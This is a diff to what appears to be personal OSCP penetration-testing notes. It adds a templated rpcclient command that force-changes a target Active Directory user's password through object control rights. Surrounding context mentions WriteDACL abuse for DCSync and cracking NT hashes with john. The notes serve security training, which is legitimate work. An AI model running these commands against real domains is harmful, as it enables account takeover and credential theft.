@@ -47,7 +47,24 @@ dv.paragraph("```bash\n" + command + "\n```");
 ![[Pasted image 20260911174809.png]]
 
 ---
+## First Degree Object Control / Force Change Password 
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
+const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `rpcclient -U '${discoveredDomain}/[AdminUser]%[PW]' ${ip} -c 'setuserinfo2 [targetUser] 23 "[myPW]"'`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+![[Pasted image 20260913152431.png]]
+
+Means your password has to be more complex
+
+No response = good
+
+---
 ## WriteDACL
 
 give our new user the DCSync rights
@@ -148,3 +165,4 @@ dv.paragraph("```bash\n" + command + "\n```");
 john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
+---
